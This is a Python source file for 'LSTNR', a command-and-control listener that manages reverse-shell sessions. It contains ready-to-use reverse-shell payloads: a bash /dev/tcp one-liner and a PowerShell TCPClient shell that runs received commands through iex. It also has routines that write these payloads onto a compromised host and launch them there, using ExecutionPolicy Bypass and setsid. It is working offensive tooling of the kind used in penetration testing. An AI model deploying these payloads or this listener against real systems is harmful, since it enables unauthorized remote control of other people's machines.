import select  # Allows checking if sockets have available data to read
import socket  # Provides networking capabilities
import threading  # Enables running multiple tasks simultaneously (multithreading)
import sys  # Gives access to system-specific parameters and functions
import queue  # Implements a FIFO queue, used for handling notifications
import time  # Used for timestamps and delays
import os  # Provides OS-related functions like file handling
import subprocess  # To run shell commands and capture output
import re
import readline  # Allows command history functionality

# ANSI escape codes for colors
RED = "\033[91m"
GREEN = "\033[92m"
BLUE = "\033[94m"
ORANGE = "\033[38;5;214m"
PINK = "\033[95m"
PURPLE = "\033[35m"
YELLOW = "\033[93m"
BROWN = "\033[33m"
WHITE = "\033[97m"
RESET = "\033[0m"  # Reset color back to default


HOST = "0.0.0.0"
PORT = None  # Port will be set from command-line arguments

sessions = {}
session_id = 0
lock = threading.Lock()

notifications = queue.Queue()  # Queue to store new session messages

# Log file for session
# path with timestamp
#LOG_FILE = f"{time.strftime('%Y-%m-%d_%H-%M-%S')}-sessions.log"
LOG_DIR = "logs-lstnr"  # Directory for logs
os.makedirs(LOG_DIR, exist_ok=True)  # Ensure the directory exists
LOG_FILE = os.path.join(LOG_DIR, f"{time.strftime('%Y-%m-%d_%H-%M-%S')}-sessions.log")

# command history to read from
HISTORY_FILE = os.path.expanduser("~/.lstnr_history")
# Load previous history if exists
if os.path.exists(HISTORY_FILE):
    readline.read_history_file(HISTORY_FILE)
# Automatically save history on exit
import atexit
atexit.register(readline.write_history_file, HISTORY_FILE)


def clean_output(output):
    """Cleans the output by removing the command prompt part (if any)."""
    # Remove Windows PowerShell or Command Prompt prompts like 'PS C:\Users\username>'
    cleaned_output = re.sub(r'PS\s.*?>\s*$', '', output)
    return cleaned_output.strip()

# Initialize logging to a file
def init_log_file():
    """Initialize the log file by writing a header."""
    with open(LOG_FILE, 'w') as log_file:
        log_file.write("LSTNR Log File\n")
        log_file.write("Start Time: {}\n".format(time.ctime()))
        log_file.write("="*50 + "\n")

def log_to_file(message):
    """Log message to the sessions.log file."""
    with open(LOG_FILE, 'a') as log_file:
        log_file.write(message + "\n")

def print_error(error_message):
    """Prints errors in red."""
    message = f"{RED}[!] ERROR: {error_message}{RESET}"
    print(message)
    log_to_file(message)  # Log error to the file

def print_menu():
    """Prints a formal list of available commands."""
    message = f"""{ORANGE}
╔════════════════════════════════════════════════════════════════════════╗
║                           MENU COMMANDS                                ║
╠════════════════════════════════════════════════════════════════════════╣
║ Show this help menu                                           help | ? ║
║ List active sessions                                                ls ║
║ Connect to a session by ID                                     cs <id> ║
║ Save rev.sh locally            payload linux -lhost <IP> -lport <PORT> ║
║ Save rev.ps1 locally         payload windows -lhost <IP> -lport <PORT> ║
║ Kill all sessions                                                  die ║
║ Kill all and shutdown LSTNR                                       exit ║
╠════════════════════════════════════════════════════════════════════════╣
║                         SESSION COMMANDS                               ║
╠════════════════════════════════════════════════════════════════════════╣
║ Update session info                                             whoami ║
║ Update session info                                           hostname ║
║ Background current session                                 bs | CTRL+C ║
║ Upgrade TTY shell (Linux)                                       stable ║
║ Build rev.ps1 on TGT and connect                       payload windows ║
║ Build rev.sh on TGT and connect                          payload linux ║
║ Kill current session                                               die ║
╚════════════════════════════════════════════════════════════════════════╝{RESET}
"""
    print(message)
    log_to_file("Displayed menu.")

def handle_client(client_socket, addr, session_number):
    """Creates a fully interactive reverse shell with real-time output."""
    print(f"{GREEN}[+] Session {session_number} connected from {addr}{RESET}")
    log_to_file(f"[+] Session {session_number} connected from {addr}")  # Log session start

    stop_event = threading.Event()

    def receive_output():
        """Continuously receive and display output in real-time."""
        try:
            while not stop_event.is_set():
                ready, _, _ = select.select([client_socket], [], [], 0.1)  # Non-blocking wait
                if ready:
                    data = client_socket.recv(4096)
                    if not data:
                        break  # Connection closed
                    sys.stdout.write(data.decode(errors="ignore"))  # Print immediately
                    sys.stdout.flush()

                    # Log the command output
                    log_to_file(data.decode(errors="ignore"))
        except OSError:  # Handle 'Bad file descriptor' error
            pass  
        except Exception as e:
            print_error(f"Receive error: {e}")

    # Start the receive thread
    recv_thread = threading.Thread(target=receive_output, daemon=True)
    recv_thread.start()

    try:
        # Skip automatic whoami and hostname retrieval
        while True:
            # allows command history while interacting with a shell
            command = input().strip()
            # Original command
            #command = sys.stdin.readline().strip()  # Read user input properly

            # Log the user input command
            if command:
                log_to_file(f"Command: {command}")

            if command.lower() == "bs":
                print(f"{ORANGE}[+] Session {session_number} moved to background.{RESET}")
                log_to_file(f"[+] Session {session_number} moved to background.")
                stop_event.set()
                return

            if command.lower() == "die":
                print(f"{ORANGE}[!] Killing session {session_number}.{RESET}")
                log_to_file(f"[!] Killing session {session_number}.")
                stop_event.set()  # Stop receiving thread
                recv_thread.join()  # Wait for thread to fully stop
                try:
                    client_socket.sendall(b"exit\n")
                    client_socket.close()
                except OSError:
                    pass  # Ignore socket already closed errors
                
                with lock:
                    del sessions[session_number]
                return

            # Check for "whoami" command
            if command.lower() == "whoami":
                try:
                    # The session we're currently working with
                    session = sessions[session_number]  # Get the current session using its session number
                    client_socket = session["socket"]  # The client's socket for this session
                    #time.sleep(1)
                    client_socket.sendall(b"whoami\n")
                    whoami_output = client_socket.recv(4096).decode(errors="ignore").strip()
                    whoami_output = clean_output(whoami_output)
                    session["whoami"] = whoami_output
                    print(f"{GREEN}{whoami_output}{RESET}")
                    log_to_file(f"Captured whoami for session {session_number}: {whoami_output}")
                except Exception as e:
                    print_error(f"[!] Error during gather for session {session_number}: {e}")
            # Check for "hostname" command
            if command.lower() == "hostname":
                try:
                    # The session we're currently working with
                    session = sessions[session_number]  # Get the current session using its session number
                    client_socket = session["socket"]  # The client's socket for this session
                    #time.sleep(1)
                    client_socket.sendall(b"hostname\n")
                    hostname_output = client_socket.recv(4096).decode(errors="ignore").strip()
                    hostname_output = clean_output(hostname_output)
                    session["hostname"] = hostname_output
                    print(f"{GREEN}{hostname_output}{RESET}")
                    log_to_file(f"Captured hostname for session {session_number}: {hostname_output}")
                except Exception as e:
                    print_error(f"[!] Error during gather for session {session_number}: {e}")

            # Check for "stable" command
            if command.lower() == "stable":
                try:
                    session = sessions[session_number]
                    client_socket = session["socket"]

                    # Send the TTY upgrade command directly without sending 'stable'
                    tty_command = 'python3 -c \'import pty; pty.spawn("/bin/bash")\'\n'
                    client_socket.sendall(tty_command.encode())

                    print(f"{ORANGE}[+] Sent TTY upgrade command to session {session_number}.{RESET}")
                    log_to_file(f"[+] Sent TTY upgrade command to session {session_number}.")
                except Exception as e:
                    print_error(f"[!] Error during shell upgrade for session {session_number}: {e}")

            
            # builds a new revshell for the current session
            # basically, if your current session elevates or is a new user
            # use this to create a new session just for the new user
            if command.lower() == "payload windows":
                try:
                    session = sessions[session_number]
                    client_socket = session["socket"]
                    # Automatically detect listener IP and port from the socket
                    listener_ip = client_socket.getsockname()[0]
                    listener_port = client_socket.getsockname()[1]
                    # PowerShell reverse shell payload
                    ps_payload = f"""$client = New-Object System.Net.Sockets.TCPClient('{listener_ip}', {listener_port});
            $stream = $client.GetStream();
            [byte[]]$bytes = 0..65535|%{{0}};
            while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{
                $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
                $sendback = (iex $data 2>&1 | Out-String );
                $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
                $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
                $stream.Write($sendbyte,0,$sendbyte.Length);
                $stream.Flush();
            }}
            $client.Close();"""

                    # Escape PowerShell quotes
                    ps_encoded = ps_payload.replace("'", "''")
                    # Drop it on the client as rev.ps1
                    drop_command = f"echo '{ps_encoded}' > rev.ps1"
                    client_socket.sendall(drop_command.encode() + b"\n")
                    print(f"{YELLOW}[+] Payload created using {listener_ip}:{listener_port} and saved as rev.ps1{RESET}")
                    log_to_file(f"[+] Sent PowerShell payload using {listener_ip}:{listener_port} to session {session_number}")
                    #exec_command = "powershell -ExecutionPolicy Bypass -File rev.ps1"
                    exec_command = "Start-Process powershell -ArgumentList '-ExecutionPolicy Bypass -File rev.ps1'"
                    client_socket.sendall(exec_command.encode() + b"\n")

                except Exception as e:
                    print_error(f"[!] Error creating payload: {e}")

            # builds a new revshell for the current session
            # basically, if your current session elevates or is a new user
            # use this to create a new session just for the new user
            if command.lower() == "payload linux":
                try:
                    session = sessions[session_number]
                    client_socket = session["socket"]
                    # Automatically get listener IP and port
                    listener_ip = client_socket.getsockname()[0]
                    listener_port = client_socket.getsockname()[1]
                    # Bash reverse shell payload (no escaping needed in echo)
                    bash_payload = f"/bin/sh -i >& /dev/tcp/{listener_ip}/{listener_port} 0>&1"
                    # Command to write payload to rev.sh
                    drop_command = f'echo "{bash_payload}" > rev.sh && chmod +x rev.sh'
                    client_socket.sendall(drop_command.encode() + b"\n")
                    print(f"{YELLOW}[+] Linux payload created using {listener_ip}:{listener_port} and saved as rev.sh{RESET}")
                    log_to_file(f"[+] Sent bash reverse shell payload to session {session_number} using {listener_ip}:{listener_port}")
                    client_socket.sendall(b"setsid bash rev.sh >/dev/null 2>&1 < /dev/null &\n")
                except Exception as e:
                    print_error(f"[!] Error creating Linux payload: {e}")

            # Send other commands to the client
            else:
                client_socket.sendall(command.encode() + b"\n")

    except KeyboardInterrupt:
        print(f"\n{ORANGE}[+] Session {session_number} moved to background.{RESET}")
        log_to_file(f"[+] Session {session_number} moved to background.")
        stop_event.set()
        recv_thread.join()
        return
    except BrokenPipeError:
        print(f"{RED}[!] Session {session_number} disconnected.{RESET}")
        log_to_file(f"[!] Session {session_number} disconnected.")
        stop_event.set()
        recv_thread.join()
        return
    except Exception as e:
        print_error(str(e))

    print(f"{RED}[!] Session {session_number} disconnected.{RESET}")
    log_to_file(f"[!] Session {session_number} disconnected.")  # Log session disconnection
    with lock:
        del sessions[session_number]

def format_session_table(sessions):
    """Formats the session table with custom box-drawing characters."""

    # Define fixed width for each column
    id_width = 6
    ip_width = 18
    hostname_width = 24
    user_width = 30

    # Top border
    table = f"{BLUE}\n╔{'═' * id_width}╦{'═' * ip_width}╦{'═' * hostname_width}╦{'═' * user_width}╗\n{RESET}"
    # Header
    table += f"{BLUE}║{'ID'.center(id_width)}║{'IP ADDRESS'.center(ip_width)}║{'HOSTNAME'.center(hostname_width)}║{'USER'.center(user_width)}║\n{RESET}"
    # Header separator
    table += f"{BLUE}╠{'═' * id_width}╬{'═' * ip_width}╬{'═' * hostname_width}╬{'═' * user_width}╣\n{RESET}"
    # Rows
    for session in sessions:
        user = session['user']
        if any(keyword in user.lower() for keyword in ['root', 'admin', 'system']):
            user_display = f"{RED}{user.center(user_width)}{RESET}"
        else:
            user_display = f"{GREEN}{user.center(user_width)}{RESET}"
        
        table += f"{BLUE}║{RESET}{str(session['id']).center(id_width)}{BLUE}║{RESET}{session['ip'].center(ip_width)}{BLUE}║{RESET}{session['hostname'].center(hostname_width)}{BLUE}║{RESET}{user_display}{BLUE}║\n{RESET}"
    # Bottom border
    table += f"{BLUE}╚{'═' * id_width}╩{'═' * ip_width}╩{'═' * hostname_width}╩{'═' * user_width}╝\n{RESET}"
    return table

def session_manager():
    """Main menu that allows session management."""
    time.sleep(1)  # wait for 1 second before dropping into LSTNR$
    
    while True:
        try:
            while not notifications.empty():
                print(notifications.get())

            command = input(f"{BLUE}LSTNR$ {RESET}").strip()
            
            # Log the command input
            log_to_file(f"LSTNR$ {command}")
# help            
            if command == "help" or command == "?":
                print_menu()  # Show menu only if help or ? is typed
# nothing
            elif command == "": 
                # If the command is empty, do nothing and continue waiting for input
                continue
# list sessions         
            elif command.lower() == "ls":
                # Display new connection notification first if available
                while not notifications.empty():
                    print(notifications.get())  # Print the notifications for new connections
                # Prepare the session list in a formatted way
                session_list = []
                for sid, session in sessions.items():
                    session_list.append({
                        "id": sid,
                        "ip": session["addr"][0],
                        "user": session.get('whoami', 'N/A'),
                        "hostname": session.get('hostname', 'N/A')
                    })
                # Now print the formatted session table
                formatted_table = format_session_table(session_list)
                print(formatted_table)
                # Log the session table into the file
                log_to_file("Session list displayed:")
                log_to_file(formatted_table)
# connect session                
            elif command.startswith("cs "):
                try:
                    sid = int(command.split()[1])
                    if sid in sessions:
                        handle_client(sessions[sid]['socket'], sessions[sid]['addr'], sid)
                    else:
                        print_error("Invalid session ID.")
                except:
                    print_error("Invalid command. Usage: cs <session_id>")
# payload usage
            elif command.lower().startswith("payload") and len(command.split()) < 6:
                print(f"{ORANGE}[*] Payload Usage:{RESET}")
                print(f"  Linux:   payload linux -lhost <IP> -lport <PORT>")
                print(f"  Windows: payload windows -lhost <IP> -lport <PORT>")
                continue

# windows rev.ps1
            elif command.lower().startswith("payload windows -lhost"):
                try:
                    # Split the command into parts
                    parts = command.split()

                    # debugging step to see what the split command looks like
                    #print(f"Parts: {parts}")  # Print the parts to see how it's being split

                    # Ensure there are exactly 6 parts and the correct flags are present in the right order
                    if len(parts) != 6 or parts[1].lower() != "windows" or parts[2].lower() != "-lhost" or parts[4].lower() != "-lport":
                        print_error("Usage: payload windows -lhost <IP> -lport <port>")
                        continue
                    
                    # Get the listener IP and port from the command
                    listener_ip = parts[3]  # IP address from the fourth argument
                    listener_port = int(parts[5])  # Port from the sixth argument (cast to integer)

                    # Prepare the PowerShell reverse shell payload
                    ps_payload = f"""$client = New-Object System.Net.Sockets.TCPClient('{listener_ip}', {listener_port});
            $stream = $client.GetStream();
            [byte[]]$bytes = 0..65535|%{{0}}; 
            while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{
                $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
                $sendback = (iex $data 2>&1 | Out-String );
                $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
                $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
                $stream.Write($sendbyte,0,$sendbyte.Length);
                $stream.Flush();
            }}
            $client.Close();"""
                    # Write the payload to rev.ps1
                    with open("rev.ps1", "w", encoding="utf-8") as f:
                        f.write(ps_payload)
                    # Print success and log it
                    print(f"{YELLOW}[+] Windows payload saved locally as rev.ps1 with LHOST {listener_ip} and LPORT {listener_port}{RESET}")
                    log_to_file(f"[+] Windows payload saved as rev.ps1 with LHOST {listener_ip} and LPORT {listener_port}")
                except Exception as e:
                    print_error(f"[!] Error creating Windows payload: {e}")
                continue
# linux rev.sh
            elif command.lower().startswith("payload linux -lhost"):
                try:
                    # Split the command into parts
                    parts = command.split()

                    # Debugging step to see what the split command looks like
                    #print(f"Parts: {parts}")  # Print the parts to see how it's being split

                    # Ensure there are exactly 6 parts and the correct flags are present in the right order
                    if len(parts) != 6 or parts[1].lower() != "linux" or parts[2].lower() != "-lhost" or parts[4].lower() != "-lport":
                        print_error("Usage: payload linux -lhost <IP> -lport <port>")
                        continue
                    
                    # Get the listener IP and port from the command
                    listener_ip = parts[3]  # IP address from the fourth argument
                    listener_port = int(parts[5])  # Port from the sixth argument (cast to integer)

                    # Prepare the bash reverse shell payload
                    bash_payload = f"/bin/sh -i >& /dev/tcp/{listener_ip}/{listener_port} 0>&1"

                    # Write the payload to rev.sh
                    with open("rev.sh", "w", encoding="utf-8") as f:
                        f.write(bash_payload)

                    # Make the rev.sh file executable
                    os.chmod("rev.sh", 0o755)

                    print(f"{YELLOW}[+] Linux payload saved locally as rev.sh with LHOST {listener_ip} and LPORT {listener_port}{RESET}")
                    log_to_file(f"[+] Linux payload saved as rev.sh with LHOST {listener_ip} and LPORT {listener_port}")

                except Exception as e:
                    print_error(f"[!] Error creating Linux payload: {e}")
                continue




# kill all sessions
            elif command.lower() == "die":
                print(f"{ORANGE}[!] Killing all sessions.{RESET}")
                log_to_file("[!] Killing all sessions.")
                with lock:
                    for sid in list(sessions.keys()):
                        sessions[sid]["socket"].send(b"exit\n")
                        sessions[sid]["socket"].close()
                        del sessions[sid]
                print(f"{ORANGE}[+] All sessions killed.{RESET}")
                log_to_file("[+] All sessions killed.")
# shutdown lstnr
            elif command.lower() == "exit":
                print(f"{ORANGE}[!] Killing all sessions.{RESET}")
                print(f"{PINK}[+] Shutting down LSTNR.{RESET}")
                log_to_file("[!] Killing all sessions. Shutting down LSTNR.")
                break
            else:
                print_menu()  # If command doesn't match any known ones, display the menu
        except KeyboardInterrupt:
            print(f"\n{RED}[!] Type 'exit' to close LSTNR.{RESET}")
        except Exception as e:
            print_error(str(e))


def start_listener():
    """Starts the listener and accepts incoming connections."""
    global session_id

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    try:
        server.bind((HOST, PORT))
    except OSError as e:
        print_error(e)
        sys.exit(1)

    server.listen(5)
    print(f""" {PINK}
    ██╗     ███████╗████████╗███╗   ██╗██████╗ 
    ██║     ██╔════╝╚══██╔══╝████╗  ██║██╔══██╗
    ██║     ███████╗   ██║   ██╔██╗ ██║██████╔╝
    ██║     ╚════██║   ██║   ██║╚██╗██║██╔══██╗
    ███████╗███████║   ██║   ██║ ╚████║██║  ██║
    ╚══════╝╚══════╝   ╚═╝   ╚═╝  ╚═══╝╚═╝  ╚═╝
    Remote Command & Control - v0.6
    - MADE FOR REVERSE SHELL MANAGEMENT{RESET}
    """)
    print(f"{ORANGE}[*] Listening on {HOST}:{PORT}{RESET}")
    log_to_file(f"[*] Listening on {HOST}:{PORT}")

    while True:
        try:
            client_socket, addr = server.accept()
            with lock:
                session_id += 1
                sessions[session_id] = {"socket": client_socket, "addr": addr}
            notifications.put(f"{GREEN}[+] New connection from {addr}. Assigned Session ID: {session_id}{RESET}")
            log_to_file(f"[+] New connection from {addr}. Assigned Session ID: {session_id}")
        except Exception as e:
            print_error(str(e))

if __name__ == "__main__":
    if len(sys.argv) != 3 or sys.argv[1] != "-p":
        print_error("Usage: ./lstnr.py -p <port>")
        sys.exit(1)

    try:
        PORT = int(sys.argv[2])
        if PORT < 1 or PORT > 65535:
            raise ValueError
    except ValueError:
        print_error("Invalid port number. Use a port between 1 and 65535.")
        sys.exit(1)

    try:
        init_log_file()  # Initialize the log file with timestamped name
        listener_thread = threading.Thread(target=start_listener, daemon=True)
        listener_thread.start()

        session_manager()
    except KeyboardInterrupt:
        print(f"\n{RED}[!] Exiting... Closing all connections.{RESET}")
        for sid in list(sessions.keys()):
            try:
                sessions[sid]["socket"].send(b"exit\n")
                sessions[sid]["socket"].close()
            except:
                pass
        sys.exit(0)
    except Exception as e:
        print_error(str(e))
